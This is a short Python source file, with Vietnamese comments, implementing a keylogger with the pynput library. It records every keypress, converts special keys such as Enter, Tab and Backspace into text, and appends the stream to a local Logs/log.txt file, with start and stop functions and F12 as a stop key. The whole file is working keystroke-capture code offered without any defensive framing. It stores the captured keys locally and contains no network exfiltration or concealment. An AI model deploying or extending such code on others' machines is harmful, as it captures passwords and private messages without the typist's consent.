from pynput.keyboard import Listener
import os

# Tạo đường dẫn tương đối cho thư mục Logs
log_dir = os.path.join(os.path.dirname(__file__), '..', 'Logs') 
log_file_path = os.path.join(log_dir, "log.txt")

# Tạo thư mục nếu chưa tồn tại
os.makedirs(log_dir, exist_ok=True)

running = True
listener = None  # Thêm biến để giữ Listener

def anonymous(key):
    global running
    if not running:  
        return False 

    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        stop_keylogger()  # Gọi stop_keylogger() để dừng keylogger
        return False 
    
    # Xử lý các phím đặc biệt
    if key == "Key.ctrl_l":
        key = ""
    if key == "Key.enter":
        key = "\n"
    if key == "Key.alt_l":
        key = "\n"
    if key == "Key.tab":
        key = "\n"
    if key == "Key.space":
        key = " Key.space "
    if key == "Key.backspace":
        key = " Key.backspace "
    if key == "Key.shift":
        key = " Key.shift "
    
    # Ghi vào file log
    with open(log_file_path, "a", encoding="utf8") as file:
        file.write(key)
    print(key)

def start_keylogger():
    """Bắt đầu keylogger."""
    global running, listener
    running = True  # Đặt biến điều khiển thành True
    listener = Listener(on_press=anonymous)  # Tạo listener mới
    listener.start()  # Bắt đầu listener
    print("Keylogger đã bắt đầu.")  # Thông báo khi keylogger bắt đầu

def stop_keylogger():
    """Dừng keylogger."""
    global running, listener
    running = False  # Đặt biến điều khiển thành False
    if listener is not None:
        listener.stop()  # Dừng listener
        listener.join()  # Đợi cho listener dừng hoàn toàn
        print("Keylogger đã dừng lại.")  # Thông báo cho người dùng
